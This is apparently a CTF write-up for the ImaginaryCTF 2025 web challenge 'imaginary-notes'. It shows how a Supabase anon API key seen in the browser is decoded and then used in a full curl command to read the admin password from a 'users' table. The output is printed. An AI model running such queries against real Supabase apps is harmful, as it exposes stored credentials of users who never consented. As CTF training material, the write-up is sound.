---
layout: post
title:  "imaginary-notes"
date:   2025-09-08 21:26:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /imaginaryctf-2025-imaginary-notes/
---

**Title:** imaginary-notes

**Category:** Web

**Author:** cleverbear57

**Description:** I made a new note taking app using Supabase! Its so secure, I put my flag as the password to the "admin" account. I even put my anonymous key somewhere in the site. The password database is called, "users". 

`http://imaginary-notes.chal.imaginaryctf.org`

I go to the site and see a login page and an option for a signup. I try some common credentials, then register and login. 

As I login (with browser tools in the network tab) I see a GET request to `https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?select=*&username=eq.uzi&password=eq.uzi`. 

In the headers I see the api key. I put it in `jwt.io`:
```shell 
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "iss": "supabase",
  "ref": "dpyxnwiuwzahkxuxrojp",
  "role": "anon",
  "iat": 1751760507,
  "exp": 2067336507
}
```

I can query the database using the anon api key. Make this request:
```shell
curl -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI" "https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?select=*&username=eq.admin"

[{"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9","username":"admin","password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}]
```
`ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}`